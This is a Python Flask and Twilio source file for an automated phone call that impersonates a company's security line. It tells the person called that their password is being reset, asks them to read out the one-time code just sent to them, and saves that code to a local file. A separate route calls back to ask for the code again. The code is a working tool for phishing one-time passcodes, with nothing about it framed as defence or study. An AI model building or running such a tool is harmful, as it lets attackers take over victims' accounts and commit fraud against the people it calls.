from flask import Flask, request
from twilio.twiml.voice_response import VoiceResponse, Gather, Play

app = Flask(__name__)

@app.route("/voice", methods=['GET', 'POST'])
def voice():
    # Start a TwiML response
    resp = VoiceResponse()
    resp.say(f"Hello {open('Extra/Name.txt', 'r').read()}, your {open('Extra/Company Name.txt', 'r').read()} account password is trying to be reset,")
    gather = Gather(num_digits=1, action='/gather')
    gather.say('If this was not you please press 1,')
    resp.append(gather)

    return str(resp)

@app.route('/gather', methods=['GET', 'POST'])
def gather():
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()

    # If Twilio's request to our app included already gathered digits,
    # process them
    if 'Digits' in request.values:
        # Get which digit the caller chose
        choice = request.values['Digits']

        # <Say> a different message depending on the caller's choice
        if choice == '1':
            gatherotp = Gather(num_digits=int(open("Extra/Digits.txt", 'r').read()), action='/gatherotp')
            gatherotp.say(f'To block the request, please give us the {open("Extra/Digits.txt", "r").read()} digits code that we sent')
            resp.append(gatherotp)
            return str(resp)

        else:
            # If the caller didn't choose 1 or 2, apologize and ask them again
            resp.say("Sorry, I don't understand that choice.")
            resp.redirect('/voice')
            return str(resp)

    # If the user didn't choose 1 or 2 (or anything), send them back to /voice
    resp.redirect('/voice')

    return str(resp)

@app.route('/gatherotp', methods=['GET', 'POST'])
def gatherotp():
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()

    # If Twilio's request to our app included already gathered digits,
    # process them
    resp.say('Please give us a moment to connect u to a support agent')
    if 'Digits' in request.values:
        # Get which digit the caller chose
        resp.play(url='https://ia601407.us.archive.org/14/items/music_20220117/music.mp3')
        resp.say('It seems like the support are too busy, If you accidently type wrong one time passcode, We will call you again,')
        a = open('otp.txt', 'w', encoding='utf-8')
        choice1 = request.values['Digits']
        a.write(choice1)
        return str(resp)

    else:
        # If the caller didn't choose 1 or 2, apologize and ask them again
        resp.say("Sorry, I don't understand that choice.")
        resp.redirect('/gather')
        return str(resp)

@app.route("/voiceagain", methods=['GET', 'POST'])
def voiceagain():
    # Start a TwiML response
    resp = VoiceResponse()
    resp.say(f"Hello {open('Extra/Name.txt', 'r').read()}, it seems like you accidently type wrong one time passcode,")
    gather = Gather(num_digits=1, action='/gather')
    gather.say('To enter the one time passcode again,Press 1,')
    resp.append(gather)

    return str(resp)


if __name__ == "__main__":
    app.run(debug=True)
